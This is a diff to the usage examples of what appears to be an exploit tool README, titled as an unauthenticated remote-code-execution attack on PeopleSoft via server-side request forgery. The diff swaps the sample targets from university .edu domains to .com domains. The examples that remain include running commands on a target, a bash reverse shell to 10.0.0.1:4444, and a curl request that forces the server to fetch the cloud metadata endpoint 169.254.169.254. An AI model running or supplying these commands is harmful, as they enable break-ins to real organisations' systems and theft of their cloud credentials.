@@ -5,13 +5,13 @@ Universal Unauthenticated RCE via PeopleSoft SSRF
  Usage Examples :
  ```bash
 # Basic command execution
-python3 exploit.py -u https://any-university.edu -c "whoami"
+python3 exploit.py -u https://any-pplsoft.com -c "whoami"
 
 # Interactive reverse shell
-python3 exploit.py -u https://target.ps.edu -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" --shell --lhost 10.0.0.1 --lport 4444
+python3 exploit.py -u https://target.ps.com -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" --shell --lhost 10.0.0.1 --lport 4444
 
 # Manual SSRF testing (if automation fails)
-curl -k -X POST https://target.edu/PSIGW/HttpListeningConnector \
+curl -k -X POST https://target.com/PSIGW/HttpListeningConnector \
   -H "Content-Type: application/xml" \
   -d '<Envelope><Body><EnvironmentManagement><sourceURL>http://169.254.169.254/latest/meta-data/</sourceURL></EnvironmentManagement></Body></Envelope>'
 ```
